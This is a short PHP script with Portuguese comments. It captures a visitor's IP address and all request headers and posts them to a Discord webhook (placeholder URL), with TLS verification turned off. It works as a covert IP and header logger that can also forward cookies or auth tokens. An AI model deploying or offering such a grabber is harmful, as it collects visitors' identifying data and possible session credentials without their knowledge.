<?php
// Obtém o IP do usuário
$ip = $_SERVER['REMOTE_ADDR'];

// Obtém o cabeçalho (header) da requisição
$header = getallheaders();

// Monta os dados que serão enviados via webhook
$data = array(
    'username' => 'Testing BOT',
    'content' => "IP: $ip\n\nHeader:\n" . print_r($header, true)
);

// URL do webhook
$url = "https://discordapp.com/api/webhooks/xxxxxxxxx";

// Cabeçalhos da requisição
$headers = array(
    'Content-Type: application/json; charset=utf-8'
);

// Configura as opções do cURL
$options = array(
    CURLOPT_URL => $url,
    CURLOPT_POST => true,
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_POSTFIELDS => json_encode($data)
);

// Inicializa o cURL
$ch = curl_init();
curl_setopt_array($ch, $options);

// Executa a requisição e obtém a resposta
$response = curl_exec($ch);

// Verifica se ocorreu algum erro
if (curl_errno($ch)) {
    echo 'Erro ao enviar a requisição: ' . curl_error($ch);
} else {
    echo 'Requisição enviada com sucesso!';
}

// Fecha a conexão cURL
curl_close($ch);
?>
